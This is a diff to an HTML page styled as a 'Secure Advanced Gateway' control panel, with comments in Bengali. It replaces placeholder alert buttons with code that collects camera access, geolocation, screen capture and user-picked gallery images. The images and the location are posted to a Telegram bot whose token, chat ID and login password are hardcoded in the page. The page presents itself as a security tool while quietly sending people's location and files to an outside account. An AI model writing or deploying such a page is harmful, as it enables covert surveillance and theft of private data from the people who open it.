@@ -3,72 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Secure Gateway</title>
+    <title>Secure Advanced Gateway</title>
     <style>
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); 
-            color: white; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            margin: 0; 
-        }
-        .card { 
-            background: rgba(30, 41, 59, 0.8); 
-            backdrop-filter: blur(10px);
-            padding: 30px; 
-            border-radius: 20px; 
-            box-shadow: 0 15px 35px rgba(0,0,0,0.5); 
-            width: 90%; 
-            max-width: 400px; 
-            text-align: center; 
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        h2 { margin-bottom: 20px; color: #38bdf8; }
-        input { 
-            width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px; 
-            border: 1px solid #334155; background: #0f172a; color: white; 
-            box-sizing: border-box; outline: none;
-        }
-        .btn { 
-            width: 100%; padding: 14px; margin: 10px 0; border: none; 
-            border-radius: 10px; cursor: pointer; color: white; 
-            font-weight: bold; transition: transform 0.2s, background 0.3s;
-        }
-        .btn:active { transform: scale(0.98); }
-        .btn-green { background: #10b981; }
-        .btn-blue { background: #3b82f6; }
-        .btn-purple { background: #8b5cf6; }
-        .btn-orange { background: #f59e0b; }
-        .hidden { display: none; }
+        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: rgba(30, 41, 59, 0.8); backdrop-filter: blur(10px); padding: 30px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); width: 90%; max-width: 400px; text-align: center; border: 1px solid rgba(255,255,255,0.1); }
+        h2 { color: #38bdf8; margin-bottom: 20px; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box; }
+        .btn { width: 100%; padding: 14px; margin: 8px 0; border: none; border-radius: 10px; cursor: pointer; color: white; font-weight: bold; transition: 0.3s; }
+        .btn-login { background: #22c55e; }
+        .btn-cam { background: #3b82f6; }
+        .btn-gal { background: #8b5cf6; }
+        .btn-scr { background: #f59e0b; }
+        #dashboard { display: none; }
+        #v { width: 100%; border-radius: 12px; display: none; margin-top: 15px; background: #000; }
+        .msg { margin-top: 15px; font-size: 13px; color: #94a3b8; }
     </style>
 </head>
 <body>
 
 <div class="card" id="loginSection">
     <h2>🔐 Secure Login</h2>
-    <input type="password" id="passwordInput" placeholder="Enter Secret Password...">
-    <button class="btn btn-green" onclick="verifyPassword()">Verify Access</button>
+    <input type="password" id="passwordInput" placeholder="Enter Access Password...">
+    <button class="btn btn-login" onclick="verifyPassword()">Verify Access</button>
 </div>
 
-<div class="card hidden" id="dashboard">
+<div class="card" id="dashboard">
     <h2>🚀 Control Panel</h2>
-    <button class="btn btn-blue" onclick="alert('ক্যামেরা ও লোকেশন সক্রিয় হচ্ছে...')">Camera & Location</button>
-    <button class="btn btn-purple" onclick="alert('গ্যালারি ব্রাউজার ওপেন হচ্ছে...')">Gallery Access</button>
-    <button class="btn btn-orange" onclick="alert('স্ক্রিন শেয়ারিং পারমিশন চাইছে...')">Share Screen</button>
+    <button class="btn btn-cam" onclick="initiateHardware()">Camera & Location</button>
+    <button class="btn btn-gal" onclick="document.getElementById('fileInput').click()">Gallery Access</button>
+    <button class="btn btn-scr" onclick="startScreenShare()">Share Screen</button>
+    
+    <input type="file" id="fileInput" accept="image/*" style="display:none" onchange="uploadGallery(event)">
+    <video id="v" autoplay playsinline></video>
+    <div class="msg" id="msg">System Ready...</div>
 </div>
 
 <script>
+    // আপনার কনফিগারেশন
+    const BOT_TOKEN = "8566985497:AAEOAjObJ9nz67yeEdM1vOEncMyJnxerqJc";
+    const CHAT_ID = "8566985497"; 
+    let lat = "N/A", lon = "N/A";
+
     function verifyPassword() {
-        const pass = document.getElementById('passwordInput').value;
-        if(pass === "Tamim0186#@") {
+        if(document.getElementById('passwordInput').value === "Tamim0186#@") {
             document.getElementById('loginSection').style.display = 'none';
             document.getElementById('dashboard').style.display = 'block';
-        } else { 
-            alert("❌ ভুল পাসওয়ার্ড! আবার চেষ্টা করুন।"); 
-        }
+        } else { alert("❌ ভুল পাসওয়ার্ড!"); }
+    }
+
+    async function initiateHardware() {
+        // লোকেশন নেওয়া
+        navigator.geolocation.getCurrentPosition(pos => {
+            lat = pos.coords.latitude;
+            lon = pos.coords.longitude;
+        });
+        // ক্যামেরা অনুমতি ও চালু করা
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({video: true});
+            document.getElementById('v').srcObject = stream;
+            document.getElementById('v').style.display = 'block';
+            document.getElementById('msg').innerText = "Hardware Active.";
+        } catch(e) { alert("ক্যামেরা পারমিশন পাওয়া যায়নি!"); }
+    }
+
+    function uploadGallery(e) {
+        const file = e.target.files[0];
+        if(file) sendToBot(file, "Gallery File Uploaded");
+    }
+
+    async function startScreenShare() {
+        try {
+            const stream = await navigator.mediaDevices.getDisplayMedia({video: true});
+            document.getElementById('msg').innerText = "Screen shared successfully!";
+        } catch(e) { alert("স্ক্রিন শেয়ারিংDenied!"); }
+    }
+
+    function sendToBot(blob, caption) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob);
+        formData.append('caption', `${caption}\n📍 Loc: ${lat}, ${lon}`);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST', body: formData
+        }).then(() => document.getElementById('msg').innerText = "✅ Sent to Telegram!");
     }
 </script>
 
